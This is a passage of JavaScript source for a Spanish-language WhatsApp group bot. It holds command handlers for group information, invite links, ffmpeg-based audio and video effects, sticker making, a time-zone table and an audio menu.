					var numhours = Math.floor((seconds % 86400) / 3600);
					var numminutes = Math.floor(((seconds % 86400) % 3600) / 60);
					var numseconds = ((seconds % 86400) % 3600) % 60;
					return numdays + " dias" /*+ numhours + " horas " + numminutes + " minutos " + numseconds + " segundos";*/
				}

				var infogp = `
*Nombre del grupo* : ${res.subject}
*Creado por* : _@${res.id.split('-')[0] ? res.id.split('-')[0] : "[ ! ] Número del creador principal no encontrado"}_
*Fecha de creacion* : _${formatDate(res.creation * 1000)}_ ${nwn}${res.subjectOwner ? `
*Asunto cambiado por* @${res.subjectOwner.split`@`[0]}, *fecha* : _${formatDate(res.subjectTime * 1000)}_`: ''}${res.descOwner ? `
*Descripcion cambiado por* @${res.descOwner.split`@`[0]}, *fecha* : _${formatDate(res.descTime * 1000)}_` : ''}
*Mensajes temporales* : _${secondsToString(res.ephemeralDuration) ? secondsToString(res.ephemeralDuration) : "Desactivados"}_
*Total de participantes* : _${res.participants.length}_
*Total de administradores* : _${res.participants.filter(x => x.isAdmin == true).length}_
*No administradores* : _${res.participants.filter(x => x.isAdmin == false).length}_
*ID del grupo* : _${res.id}_
*Descripción* : \n\n${res.desc}
`.trim()
				teslagod.sendMessage(from, gpthumb, image, {
					thumbnail: mythumb,
					sendEphemeral: true,
					quoted: fakemek,
					caption: `${infogp}`
				})

			}
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 2)
			break
			case 'admins':
			case 'administradores': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				teks = `*Administradores del grupo* : ${groupMetadata.subject}\n\n*Total* : _${groupAdmins.length}_\n\n`
				no = 0
				for (let admon of groupAdmins) {
					no += 1
					teks += `🛡 [${no.toString()}] ⚡ @${admon.split('@')[0]}\n`
				}
				teslagod.sendMessage(from, teks, MessageType.text, {
					sendEphemeral: true,
					quoted: {
						key: {
							participant: "0@s.whatsapp.net",
							"remoteJid": "0@s.whatsapp.net"
						},
						"message": {
							"groupInviteMessage": {
								"groupJid": "51995386439-1616169743@g.us",
								"inviteCode": "m",
								"groupName": "P",
								"caption": `${fechaCompleta}`,
								'jpegThumbnail': gpthumb
							}
						}
					}
				})
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'grupolink':
			case 'gplink':
			case 'linkgrupo':
			case 'linkgp': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isBotGroupAdmins) return reply(`*[ ! ] El bot tiene que ser administrador*`)
				var linkgc = await teslagod.groupInviteCode(from)
				teslagod.sendMessage(from, {
					"text": "https://chat.whatsapp.com/" + linkgc,
					"matchedText": "https://chat.whatsapp.com/" + linkgc,
					"description": groupDesc,
					"title": groupName,
					"previewType": "NONE",
					"jpegThumbnail": mythumb,
					"inviteLinkGroupType": "DEFAULT"
				}, 'extendedTextMessage', {
					detectLinks: false,
					contextInfo: {
						forwardingScore: 508,
						isForwarded: true
					},
					quoted: fakemek
				})
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'tienda': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				let imeu2 = await teslagod.prepareMessage('0@s.whatsapp.net', userthumb, MessageType.image, {
					thumbnail: fs.readFileSync('./multimedia/imagenes/logo.jpg')
				})
				let imeg = imeu2.message.imageMessage
				let res = await teslagod.prepareMessageFromContent(from, {
					"productMessage": {
						"product": {
							"productImage": imeg,
							"productId": "4458590017530875",
							"title": `${UwU ? UwU : NameBot}`,
							"currencyCode": "PEN",
							"priceAmount1000": "-666999",
							"productImageCount": 1
						},
						"businessOwnerJid": "51995386439@s.whatsapp.net"
					}
				}, {
					quoted: fakemek,
					sendEphemeral: true
				})
				teslagod.relayWAMessage(res)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break

			//conversores
			case 'tiendaimg': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isQuotedImage) return reply(`Envie ó Responda una imagen con el comando ${prefix + command}`)
				procesando(`_Procesando, ${pushname} por favor espere..._`)
				let buferium = JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message.extendedTextMessage.contextInfo
				let buf = await teslagod.downloadAndSaveMediaMessage(buferium)
				let inu_buffer = fs.readFileSync(buf)
				let imeu2 = await teslagod.prepareMessage('0@s.whatsapp.net', inu_buffer, MessageType.image)
				let imeg = imeu2.message.imageMessage
				let res = await teslagod.prepareMessageFromContent(from, {
					"productMessage": {
						"product": {
							"productImage": imeg,
							"productId": "4458590017530875",
							"title": `${UwU ? UwU : NameBot}`,
							"currencyCode": "PEN",
							"priceAmount1000": "-6999",
							"productImageCount": 1
						},
						"businessOwnerJid": "51995386439@s.whatsapp.net"
					}
				}, {
					quoted: fakemek,
					sendEphemeral: true
				})
				teslagod.relayWAMessage(res)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'inframundo': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isQuotedAudio) return reply(`Envie ó Responda una audio con el comando ${prefix + command}`)
				convirtiendo(`_Aguarde ${pushname}, estoy procesando su pedido..._`)
				let encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
				let amedia = await teslagod.downloadAndSaveMediaMessage(encmedia)
				ran = getRandom('.mp3')
				exec(`ffmpeg -i ${amedia} -filter:a "atempo=1.7,asetrate=3486" ${ran}`, (err, stderr, stdout) => {
					fs.unlinkSync(amedia)
					if (err) return reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					buffer = fs.readFileSync(ran)
					teslagod.sendMessage(from, buffer, audio, {
						mimetype: 'audio/mp4',
						quoted: fakemek,
						contextInfo: {
							mentionedJid: [sender],
							externalAdReply: {
								title: `🎧 ${NameBot} 🎛️`,
								"body": `${command}`,
								"previewType": "PHOTO",
								"thumbnail": mylogo,
								"sourceUrl": `${reddom}`
							}
						}
					})
					fs.unlinkSync(ran)
				})
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'nightcore':
			case 'happyhardcore': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isQuotedAudio) return reply(`Envie ó Responda una audio con el comando ${prefix + command}`)
				convirtiendo(`_Aguarde ${pushname}, estoy procesando su pedido..._`)
				let encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
				let amedia = await teslagod.downloadAndSaveMediaMessage(encmedia)
				ran = getRandom('.mp3')
				exec(`ffmpeg -i ${amedia} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, (err, stderr, stdout) => {
					fs.unlinkSync(amedia)
					if (err) return reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					buffer = fs.readFileSync(ran)
					teslagod.sendMessage(from, buffer, audio, {
						mimetype: 'audio/mp4',
						quoted: fakemek,
						contextInfo: {
							mentionedJid: [sender],
							externalAdReply: {
								title: `🎧 ${NameBot} 🎛️`,
								"body": `${command}`,
								"previewType": "PHOTO",
								"thumbnail": mylogo,
								"sourceUrl": `${reddom}`
							}
						}
					})
					fs.unlinkSync(ran)
				})
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'ardilla': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isQuotedAudio) return reply(`Envie ó Responda una audio con el comando ${prefix + command}`)
				convirtiendo(`_Aguarde ${pushname}, estoy procesando su pedido..._`)
				let encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
				let amedia = await teslagod.downloadAndSaveMediaMessage(encmedia)
				ran = getRandom('.mp3')
				exec(`ffmpeg -i ${amedia} -filter:a "atempo=0.8,asetrate=65100" ${ran}`, (err, stderr, stdout) => {
					fs.unlinkSync(amedia)
					if (err) return reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					buffer = fs.readFileSync(ran)
					teslagod.sendMessage(from, buffer, audio, {
						mimetype: 'audio/mp4',
						quoted: fakemek,
						contextInfo: {
							mentionedJid: [sender],
							externalAdReply: {
								title: `🎧 ${NameBot} 🎛️`,
								"body": `${command}`,
								"previewType": "PHOTO",
								"thumbnail": mylogo,
								"sourceUrl": `${reddom}`
							}
						}
					})
					fs.unlinkSync(ran)
				})
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'superveloz':
			case 'supervelos': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isQuotedAudio) return reply(`Envie ó Responda una audio con el comando ${prefix + command}`)
				convirtiendo(`_Aguarde ${pushname}, estoy procesando su pedido..._`)
				let encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
				let amedia = await teslagod.downloadAndSaveMediaMessage(encmedia)
				ran = getRandom('.mp3')
				exec(`ffmpeg -i ${amedia} -filter:a "atempo=1.0,asetrate=95100" ${ran}`, (err, stderr, stdout) => {
					fs.unlinkSync(amedia)
					if (err) return reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					buffer = fs.readFileSync(ran)
					teslagod.sendMessage(from, buffer, audio, {
						mimetype: 'audio/mp4',
						quoted: fakemek,
						contextInfo: {
							mentionedJid: [sender],
							externalAdReply: {
								title: `🎧 ${NameBot} 🎛️`,
								"body": `${command}`,
								"previewType": "PHOTO",
								"thumbnail": mylogo,
								"sourceUrl": `${reddom}`
							}
						}
					})
					fs.unlinkSync(ran)
				})
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'demonio': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isQuotedAudio) return reply(`Envie ó Responda una audio con el comando ${prefix + command}`)
				convirtiendo(`_Aguarde ${pushname}, estoy procesando su pedido..._`)
				let encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
				let amedia = await teslagod.downloadAndSaveMediaMessage(encmedia)
				ran = getRandom('.mp3')
				exec(`ffmpeg -i ${amedia} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
					fs.unlinkSync(amedia)
					if (err) return reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					buffer = fs.readFileSync(ran)
					teslagod.sendMessage(from, buffer, audio, {
						mimetype: 'audio/mp4',
						quoted: fakemek,
						contextInfo: {
							mentionedJid: [sender],
							externalAdReply: {
								title: `🎧 ${NameBot} 🎛️`,
								"body": `${command}`,
								"previewType": "PHOTO",
								"thumbnail": mylogo,
								"sourceUrl": `${reddom}`
							}
						}
					})
					fs.unlinkSync(ran)
				})
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'lento': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isQuotedAudio) return reply(`Envie ó Responda una audio con el comando ${prefix + command}`)
				convirtiendo(`_Aguarde ${pushname}, estoy procesando su pedido..._`)
				let encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
				let amedia = await teslagod.downloadAndSaveMediaMessage(encmedia)
				ran = getRandom('.mp3')
				exec(`ffmpeg -i ${amedia} -filter:a "atempo=0.7,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
					fs.unlinkSync(amedia)
					if (err) return reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					buffer = fs.readFileSync(ran)
					teslagod.sendMessage(from, buffer, audio, {
						mimetype: 'audio/mp4',
						quoted: fakemek,
						contextInfo: {
							mentionedJid: [sender],
							externalAdReply: {
								title: `🎧 ${NameBot} 🎛️`,
								"body": `${command}`,
								"previewType": "PHOTO",
								"thumbnail": mylogo,
								"sourceUrl": `${reddom}`
							}
						}
					})
					fs.unlinkSync(ran)
				})
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'distorcionado':
			case 'distorsionado': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isQuotedAudio) return reply(`Envie ó Responda una audio con el comando ${prefix + command}`)
				convirtiendo(`_Aguarde ${pushname}, estoy procesando su pedido..._`)
				let encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
				let amedia = await teslagod.downloadAndSaveMediaMessage(encmedia)
				ran = getRandom('.mp3')
				exec(`ffmpeg -i ${amedia} -af equalizer=f=44:width_type=o:width=2:g=56 ${ran}`, (err, stderr, stdout) => {
					fs.unlinkSync(amedia)
					if (err) return reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					buffer = fs.readFileSync(ran)
					teslagod.sendMessage(from, buffer, audio, {
						mimetype: 'audio/mp4',
						quoted: fakemek,
						contextInfo: {
							mentionedJid: [sender],
							externalAdReply: {
								title: `🎧 ${NameBot} 🎛️`,
								"body": `${command}`,
								"previewType": "PHOTO",
								"thumbnail": mylogo,
								"sourceUrl": `${reddom}`
							}
						}
					})
					fs.unlinkSync(ran)
				})
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'aumentarbajo': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isQuotedAudio) return reply(`Envie ó Responda una audio con el comando ${prefix + command}`)
				convirtiendo(`_Aguarde ${pushname}, estoy procesando su pedido..._`)
				let encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
				let amedia = await teslagod.downloadAndSaveMediaMessage(encmedia)
				ran = getRandom('.mp3')
				exec(`ffmpeg -i ${amedia} -af equalizer=f=34:width_type=o:width=2:g=25 ${ran}`, (err, stderr, stdout) => {
					fs.unlinkSync(amedia)
					if (err) return reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					buffer = fs.readFileSync(ran)
					teslagod.sendMessage(from, buffer, audio, {
						mimetype: 'audio/mp4',
						quoted: fakemek,
						contextInfo: {
							mentionedJid: [sender],
							externalAdReply: {
								title: `🎧 ${NameBot} 🎛️`,
								"body": `${command}`,
								"previewType": "PHOTO",
								"thumbnail": mylogo,
								"sourceUrl": `${reddom}`
							}
						}
					})
					fs.unlinkSync(ran)
				})
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'amp3': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isQuotedVideo) return reply(`Envie ó Responda un video con el comando ${prefix + command}`)
				convirtiendo(`_Aguarde ${pushname}, estoy procesando su pedido..._`)
				let encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
				let amedia = await teslagod.downloadAndSaveMediaMessage(encmedia)
				ran = getRandom('.mp4')
				exec(`ffmpeg -i ${amedia} ${ran}`, (err) => {
					fs.unlinkSync(amedia)
					if (err) return reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					buffer = fs.readFileSync(ran)
					teslagod.sendMessage(from, buffer, audio, {
						mimetype: 'audio/mp4',
						quoted: fakemek,
						contextInfo: {
							mentionedJid: [sender],
							externalAdReply: {
								title: `🎞️ ${NameBot} 🎶`,
								"body": `${command}`,
								"previewType": "PHOTO",
								"thumbnail": mylogo,
								"sourceUrl": `${reddom}`
							}
						}
					})
					fs.unlinkSync(ran)
				})
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'acelerarvid': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isQuotedVideo) return reply(`Envie ó Responda un video con el comando ${prefix + command}`)
				convirtiendo(`_Aguarde ${pushname}, estoy procesando su pedido..._`)
				let encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
				let vmedia = await teslagod.downloadAndSaveMediaMessage(encmedia)
				ran = getRandom('.mp4')
				exec(`ffmpeg -i ${vmedia} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
					fs.unlinkSync(vmedia)
					if (err) return reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					buffer453 = fs.readFileSync(ran)
					teslagod.sendMessage(from, buffer453, video, {
						mimetype: 'video/mp4',
						caption: `┏━━⊱ ${command} \n┗⊱By ${pushname}`,
						quoted: fakemek,
						contextInfo: {
							mentionedJid: [sender],
							externalAdReply: {
								title: `🎞️ ${NameBot} ⏳`,
								"body": `${command}`,
								"previewType": "PHOTO",
								"thumbnail": mylogo,
								"sourceUrl": `${reddom}`
							}
						}
					})
					fs.unlinkSync(ran)
				})
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'lentovid': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isQuotedVideo) return reply(`Envie ó Responda un video con el comando ${prefix + command}`)
				convirtiendo(`_Aguarde ${pushname}, estoy procesando su pedido..._`)
				convirtiendo(`_Aguarde ${pushname}, estoy procesando su pedido..._`)
				let encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
				let vmedia = await teslagod.downloadAndSaveMediaMessage(encmedia)
				ran = getRandom('.mp4')
				exec(`ffmpeg -i ${vmedia} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
					fs.unlinkSync(vmedia)
					if (err) return reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					buffer453 = fs.readFileSync(ran)
					teslagod.sendMessage(from, buffer453, video, {
						mimetype: 'video/mp4',
						caption: `┏━━⊱ ${command} \n┗⊱By ${pushname}`,
						quoted: fakemek,
						contextInfo: {
							mentionedJid: [sender],
							externalAdReply: {
								title: `🎞️ ${NameBot} ⏳`,
								"body": `${command}`,
								"previewType": "PHOTO",
								"thumbnail": mylogo,
								"sourceUrl": `${reddom}`
							}
						}
					})
					fs.unlinkSync(ran)
				})
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'reversavid': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isQuotedVideo) return reply(`Envie ó Responda un video con el comando ${prefix + command}`)
				convirtiendo(`_Aguarde ${pushname}, estoy procesando su pedido..._`)
				let encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
				let vmedia = await teslagod.downloadAndSaveMediaMessage(encmedia)
				ran = getRandom('.mp4')
				exec(`ffmpeg -i ${vmedia} -vf reverse -af areverse ${ran}`, (err) => {
					fs.unlinkSync(vmedia)
					if (err) return reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					buffer453 = fs.readFileSync(ran)
					teslagod.sendMessage(from, buffer453, video, {
						mimetype: 'video/mp4',
						caption: `┏━━⊱ ${command} \n┗⊱By ${pushname}`,
						quoted: fakemek,
						contextInfo: {
							mentionedJid: [sender],
							externalAdReply: {
								title: `🎞️ ${NameBot} ⏳`,
								"body": `${command}`,
								"previewType": "PHOTO",
								"thumbnail": mylogo,
								"sourceUrl": `${reddom}`
							}
						}
					})
					fs.unlinkSync(ran)
				})
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'rescom': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!/image|video/.test(mime)) return reply(`Envie ó Responda un video ó imagen con el comando ${prefix + command}`)
				try {
					let quotedCaption = mek.quoted.text
					reply(quotedCaption)
				} catch {
					reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
				}
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'sticker':
			case 'stiker':
			case 'stickergif':
			case 'agif':
			case 'sgif':
			case 'stk':
			case 's':
			case 'estiker':
			case 'esticker':
			case 'estick':
			case 'estik': {
				if (isBaneado) return
				if (isLimit(sender)) return
				//if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!/image|video/.test(mime)) return reply(`Responda una imagen o video con el comando ${prefix + command}`)
				if (/image/.test(mime)) {
					let encmedialoli = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
					let imedia = await teslagod.downloadAndSaveMediaMessage(encmedialoli)
					await teslagod.sendImageAsSticker(from, imedia, mek, {
						packname: `${UwU ? UwU : groupName }`,
						author: `${pushname ? pushname : "NeKosmic"}\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n${NameBot ? NameBot : "NK-BOT"}`
					})
					fs.unlinkSync(imedia)
				} else if (/video/.test(mime)) {
					if (quoted.seconds > 11) return reply(`*[ ! ] Máximo duración de vídeo son 10 segundos!*`)
					let encmediav = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
					let vmedia = await teslagod.downloadAndSaveMediaMessage(encmediav)
					await teslagod.sendVideoAsSticker(from, vmedia, mek, {
						packname: `${UwU ? UwU : groupName }`,
						author: `${pushname ? pushname : "NeKosmic"}\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n${NameBot ? NameBot : "NK-BOT"}`
					})
					fs.unlinkSync(vmedia)
				} else {
					return reply(`*[ ! ] Por favor responda una imagen o video con el comando ${prefix + command}*\n_NOTA : duracion de video 1 a 10 segundos!_ ✓`)
				}
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 500)
			addLevelingLevel(sender, 2)
			break
			case 'horario': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				const fechaper = moment().tz('America/Lima').format('DD/MM HH:mm:ss')
				const fechamex = moment().tz('America/Mexico_City').format('DD/MM HH:mm')
				const fechabol = moment().tz('America/La_Paz').format('DD/MM HH:mm')
				const fechachi = moment().tz('America/Santiago').format('DD/MM HH:mm')
				const fechaarg = moment().tz('America/Argentina/Buenos_Aires').format('DD/MM HH:mm')
				const fechacol = moment().tz('America/Bogota').format('DD/MM HH:mm')
				const fechaecu = moment().tz('America/Guayaquil').format('DD/MM HH:mm')
				const fechacosr = moment().tz('America/Costa_Rica').format('DD/MM HH:mm')
				const fechacub = moment().tz('America/Havana').format('DD/MM HH:mm')
				const fechagua = moment().tz('America/Guatemala').format('DD/MM HH:mm')
				const fechahon = moment().tz('America/Tegucigalpa').format('DD/MM HH:mm')
				const fechanic = moment().tz('America/Managua').format('DD/MM HH:mm')
				const fechapan = moment().tz('America/Panama').format('DD/MM HH:mm')
				const fechauru = moment().tz('America/Montevideo').format('DD/MM HH:mm')
				const fechaven = moment().tz('America/Caracas').format('DD/MM HH:mm')
				const fechapar = moment().tz('America/Asuncion').format('DD/MM HH:mm')
				const fechanew = moment().tz('America/New_York').format('DD/MM HH:mm')
				const fechaasi = moment().tz('Asia/Jakarta').format('DD/MM HH:mm')
				const fechabra = moment().tz('America/Sao_Paulo').format('DD/MM HH:mm')
				reply(`${monospace}「 ZONA-HORARIA 🌎 」

⌚Peru       : ${fechaper}
⌚Mexico     : ${fechamex}
⌚Bolivia    : ${fechabol}
⌚Chile      : ${fechachi}
⌚Argentina  : ${fechaarg}
⌚Colombia   : ${fechacol}
⌚Ecuador    : ${fechaecu}
⌚Costa_Rica : ${fechacosr}
⌚Cuba       : ${fechacub}
⌚Guatemala  : ${fechagua}
⌚Honduras   : ${fechahon}
⌚Nicaragua  : ${fechanic}
⌚Panama     : ${fechapan}
⌚Uruguay    : ${fechauru}
⌚Venezuela  : ${fechaven}
⌚Paraguay   : ${fechapar}${monospace}
⚡
🤖 Zona horaria actual del bot\n${resolvedOptions.timeZone} : ${time}`)
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			case 'audiokey':
			case 'keyaudio': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				let menuaudios = `${monospace}
[CLAVES DE AUDIOS]
ᴺᵒ ᵉˢ ⁿᵉᶜᵉˢᵃʳᶦᵒ ᵘˢᵃʳ ᵉˡ ᵖʳᵉᶠᶦʲᵒ
♬ kawai
♬ baka
♬ onichan
♬ yamete
♬ kudasai
♬ yutki
♬ yokese
♬ yajaro
♬ woau
♬ unga
♬ umai
♬ imaaa
♬ uchinchi
♬ tuturu
♬ talcho
♬ ssss
♬ ohayou
♬ sempai
♬ pupu
♬ pikachu
♬ ooaa
♬ omg
♬ omaiwa
♬ omaiga
♬ ñañañi
♬ ñaña
♬ nya
♬ niconico
♬ nani
♬ motomoto
♬ mma
♬ mitamita
♬ kobarashi
♬ kataka
♬ jai
♬ jentai
♬ asennn
♬ anana
♬ ª
♬ ara ara
♬ si 👍
♬ no returbio
♬ oh me vengo
♬ con flores
♬ no digas eso papu
♬ no chupala
${monospace}`
				await teslagod.sendMessage(from, menuaudios, text, {
					quoted: fakemek,
					contextInfo: {
						externalAdReply: {
							title: `${pushname} Quieres aportar con un audio?`,
							body: 'Toca aqui ;3',
							sourceUrl: 'https://api.whatsapp.com/send?phone=51995386439&text=Wenasss%2C%20quiero%20aportar%20audios%20al%20bot%20%0ATipo%20de%20audio%3A%20%0ADuracion%3A%20',
							thumbnail: userthumb
						}
					},
					sendEphemeral: true
				})
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break

			//
			case 'aimg':
			case 'toimg': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (OnOffLine === true) return reply(`*[ ! ] El bot quedo sin internet (>﹏<)*`)
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isQuotedSticker) return reply(`Envie ó Responda un sticker con el comando ${prefix + command}`)
				convirtiendo(`_Aguarde ${pushname}, estoy procesando su pedido..._`)
				let encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
				let smedia = await teslagod.downloadAndSaveMediaMessage(encmedia)
				var ran = await getRandom('.png')
				exec(`ffmpeg -i ${smedia} ${ran}`, (err) => {
					fs.unlinkSync(smedia)
					if (err) return reply(`*[ ! ] Ocurrio un error inesperado u.u [ ! ]*`)
					buffer = fs.readFileSync(ran)
					teslagod.sendMessage(from, buffer, image, {
						thumbnail: mythumb,
						quoted: fakemek,
						contextInfo: {
							mentionedJid: [sender]
						},
						caption: `>//<`
					})
					fs.unlinkSync(ran)
				})
			}
			addFilter(from)
			await limitAdd(sender)
			addLevelingXp(sender, 450)
			addLevelingLevel(sender, 1)
			break
			//
			case 'randmenu': {
				if (isBaneado) return
				if (isLimit(sender)) return
				if (!isRegistro && !autonomo) return rgeply(regply)
				if (!isGroup) return reply(`*[ ! ] Este comando solo se puede usar en grupos*`)
				if (!isDiversion) return reply(`*[ ! ] El modo full esta desactivado*`)
				let randmenu = `${monospace}[ MENU-RANDOM ]${monospace}
 
╔═══════════
║
║➣ ${prefix}verip
║➣ ${prefix}gruposwa
║➣ ${prefix}vos
║➣ ${prefix}simi
